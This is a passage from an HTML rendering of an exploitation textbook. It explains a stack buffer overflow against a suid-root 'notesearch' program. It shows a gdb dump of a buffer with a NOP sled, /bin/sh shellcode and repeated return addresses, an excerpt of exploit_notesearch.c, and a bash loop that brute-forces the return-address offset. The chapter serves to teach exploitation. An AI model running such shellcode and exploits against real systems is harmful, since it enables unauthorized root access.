0pt;line-height: 9pt;text-align: center;">0xbffff6f6</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff6f6</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff6f6</p></td><td style="width:58pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0xbffff6f6</p></td></tr></table><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) x/s command</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">0x804a008:     &quot;./notesearch &#39;&quot;, &#39;\220&#39; &lt;repeats 60 times&gt;, &quot;1À1Û1É\231°¤Í\200j\vXQh//shh/ bin\211ãQ\211âS\211áÍ\200¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿&quot; (gdb)</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_398.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">Now the buffer contains the desired shellcode and is long enough to over- write the return address. The difficulty of finding the exact location of the return address is eased by using the repeated return address technique. But this return address must point to the shellcode located in the same buffer. This means the actual address must be known ahead of time, before it even goes into memory. This can be a difficult prediction to try to make with a dynamically changing stack. Fortunately, there is another hacking technique,</p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">called the NOP sled, that can assist with this difficult chicanery. <span class="s27">NOP </span>is an assembly instruction that is short for <span class="s27">no operation</span>. It is a single-byte instruction that does absolutely nothing. These instructions are sometimes used to waste computational cycles for timing purposes and are actually necessary in the Sparc processor architecture, due to instruction pipelining. In this case, NOP instructions are going to be used for a different purpose: as a fudge factor. We’ll create a large array (or sled) of these NOP instructions and place it before the shellcode; then, if the EIP register points to any address found in the NOP sled, it will increment while executing each NOP instruction, one at a time, until it finally reaches the shellcode. This means that as long as the return address is overwritten with any address found in the NOP sled, the EIP register will slide down the sled to the shellcode, which will execute properly. On the <span class="s27">x</span>86 architecture, the NOP instruction is equivalent to the hex byte 0x90. This means our completed exploit buffer looks something like this:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><table style="border-collapse:collapse;margin-left:92.868pt" cellspacing="0"><tr style="height:18pt"><td style="width:67pt;border-top-style:solid;border-top-width:1pt;border-top-color:#010101;border-left-style:solid;border-left-width:1pt;border-left-color:#010101;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#010101;border-right-style:solid;border-right-width:1pt;border-right-color:#010101"><p class="s65" style="padding-top: 4pt;padding-left: 17pt;text-indent: 0pt;text-align: left;">NOP sled</p></td><td style="width:67pt;border-top-style:solid;border-top-width:1pt;border-top-color:#010101;border-left-style:solid;border-left-width:1pt;border-left-color:#010101;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#010101;border-right-style:solid;border-right-width:1pt;border-right-color:#010101"><p class="s65" style="padding-top: 4pt;padding-left: 17pt;text-indent: 0pt;text-align: left;">Shellcode</p></td><td style="width:102pt;border-top-style:solid;border-top-width:1pt;border-top-color:#010101;border-left-style:solid;border-left-width:1pt;border-left-color:#010101;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#010101;border-right-style:solid;border-right-width:1pt;border-right-color:#010101"><p class="s65" style="padding-top: 4pt;padding-left: 9pt;text-indent: 0pt;text-align: left;">Repeated return address</p></td></tr></table><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">Even with a NOP sled, the approximate location of the buffer in memory must be predicted in advance. One technique for approximating the memory location is to use a nearby stack location as a frame of reference. By subtract- ing an offset from this location, the relative address of any variable can be obtained.</p><p class="s40" style="padding-top: 9pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">From exploit_notesearch.c</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_399.png"/></span></p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 107%;text-align: left;">unsigned int i, *ptr, ret, offset=270; char *command, *buffer;</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">command = (char *) malloc(200);</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">bzero(command, 200); // Zero out the new memory.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 107%;text-align: left;">strcpy(command, &quot;./notesearch \&#39;&quot;); // Start command buffer. buffer = command + strlen(command); // Set buffer at the end.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 108pt;text-indent: -8pt;text-align: left;">if(argc &gt; 1) // Set offset. offset = atoi(argv[1]);</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-top: 4pt;padding-bottom: 3pt;padding-left: 11pt;text-indent: 0pt;text-align: center;">ret = (unsigned int) &amp;i - offset; // Set return address.</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_400.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">In the notesearch exploit, the address of the variable <span class="s31">i </span>in <span class="s31">main()</span>’s stack frame is used as a point of reference. Then an offset is subtracted from that value; the result is the target return address. This offset was previously deter- mined to be 270, but how is this number calculated?</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">The easiest way to determine this offset is experimentally. The debugger will shift memory around slightly and will drop privileges when the suid root notesearch program is executed, making debugging much less useful in this case.</p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 17pt;line-height: 110%;text-align: left;">Since the notesearch exploit allows an optional command-line argument to define the offset, different offsets can quickly be tested.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_401.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ gcc exploit_notesearch.c reader@hacking:~/booksrc $ ./a.out 100</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">-------[ end of note data ]------- reader@hacking:~/booksrc $ ./a.out 200</p><p class="s31" style="padding-bottom: 2pt;padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">-------[ end of note data ]------- reader@hacking:~/booksrc $</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_402.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">However, doing this manually is tedious and stupid. BASH also has a for loop that can be used to automate this process. The <span class="s31">seq </span>command is a simple program that generates sequences of numbers, which is typically used with looping.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_403.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ seq 1 10</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">1</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">2</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">3</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">4</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">5</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">6</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">7</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">8</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">9</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">10</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ seq 1 3 10</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">1</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">4</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">7</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">10</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_404.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: justify;">When only two arguments are used, all the numbers from the first argu- ment to the second are generated. When three arguments are used, the middle argument dictates how much to increment each time. This can be used with command substitution to drive BASH’s for loop.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_405.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ for i in $(seq 1 3 10)</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">&gt; do</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">&gt; echo The value is $i</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">&gt; done</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 106%;text-align: justify;">The value is 1 The value is 4 The value is 7 The value is 10</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: justify;">reader@hacking:~/booksrc $</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_406.png"/></span></p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">The function of the for loop should be familiar, even if the syntax is a little different. The shell variable <span class="s31">$i </span>iterates through all the values found in the grave accents (generated by <span class="s31">seq</span>). Then everything between the <span class="s31">do </span>and <span class="s31">done </span>keywords is executed. This can be used to quickly test many different offsets. Since the NOP sled is 60 bytes long, and we can return anywhere on the sled, there is about 60 bytes of wiggle room. We can safely increment the offset loop with a step of 30 with no danger of missing the sled.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_407.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ for i in $(seq 0 30 300)</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">&gt; do</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">&gt; echo Trying offset $i</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">&gt; ./a.out $i</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">&gt; done</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">Trying offset 0</p><p class="s31" style="padding-bottom: 2pt;padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">[DEBUG] found a 34 byte note for user id 999 [DEBUG] found a 41 byte note for user id 999</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_408.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">When the right offset is used, the return address is overwritten with a value that points somewhere on the NOP sled. When execution tries to return to that location, it will just slide down the NOP sled into the injected shellcode instructions. This is how the default offset value was discovered.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="nav">&nbsp;&nbsp;</p><p class="nav">&nbsp;</p><p class="nav"><a href="part55.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part57.htm">Next &gt;</a></p><p class="nav">&nbsp;&nbsp;</p></body></html>
